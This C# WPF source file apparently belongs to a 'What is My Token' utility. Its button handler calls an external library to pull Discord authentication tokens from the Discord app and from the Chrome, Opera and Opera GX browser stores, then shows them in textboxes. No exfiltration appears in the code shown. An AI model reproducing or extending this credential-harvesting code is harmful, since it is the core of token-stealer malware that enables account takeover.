using GeterBin;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace What_is_My_Token
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }

		public void GetToken_Button_Click(object sender, RoutedEventArgs e)
        {
            API.GetTokenFromDiscordApp();
            API.GetTokenFromOpera();
            API.GetTokenFromChrome();
            API.GetTokenFromOperaGX();
            Discord_Textbox.Text = File.ReadLines(API._savedTokens).First();
            Web_Discord_Textbox.Text = File.ReadLines(API._savedTokens).Last();
            bool flag2 = File.Exists(API._savedTokens);
            if (flag2)
            {
                File.Delete(API._savedTokens);
            }
        }
    }
}
